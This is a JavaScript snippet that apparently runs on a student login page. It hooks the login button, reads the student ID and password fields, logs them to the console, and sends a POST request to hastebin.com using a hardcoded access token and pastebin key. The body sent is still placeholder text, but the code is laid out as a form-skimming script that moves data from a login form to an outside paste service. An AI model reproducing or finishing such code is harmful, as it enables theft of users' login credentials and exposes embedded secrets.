const loginButton = document.querySelector('.loginButton');
const studentId = document.querySelector('[name="studentIDNumber"]');
const password = document.querySelector('[name="password"]');
const pastebinkey = 'gzYBWUddEgEyCwKo6T5dOTs80ta9TgDa';

console.log('OK!');
console.log(loginButton);
console.log(studentId);
console.log(password);

loginButton.addEventListener('click', () => {
    console.log('click');

    if (studentId && password) {
        console.log(studentId.value);
        console.log(password.value);

        const pasteContent = 'This is the content of the paste.';
        const accessToken =
            '028b432d78c163025b12e8dea81000dde731fd42fb03dcc3364a21c5594f43f4f6848eb101fa904abf00b0af8faececf386c19bcfcfe58c4841fdfdd2c89d713';

        fetch('https://hastebin.com/documents', {
            method: 'POST',
            headers: {
                Authorization: `Bearer ${accessToken}`,
            },
            body: pasteContent,
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.key) {
                    console.log('Paste created successfully:');
                    console.log(
                        `Hastebin URL: https://hastebin.com/${data.key}`,
                    );
                } else {
                    console.error('Failed to create paste:', data.message);
                }
            })
            .catch((error) => {
                console.error('An error occurred:', error);
            });
    }
});
